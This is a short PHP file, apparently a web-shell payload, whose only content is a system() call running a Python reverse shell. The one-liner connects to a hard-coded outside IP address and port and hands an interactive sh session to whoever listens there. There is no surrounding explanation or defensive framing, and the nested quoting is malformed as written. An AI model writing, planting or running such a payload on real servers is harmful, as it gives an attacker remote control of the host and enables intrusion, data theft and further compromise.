
<?php

system("python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("93.185.166.35",3764));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'");

?>
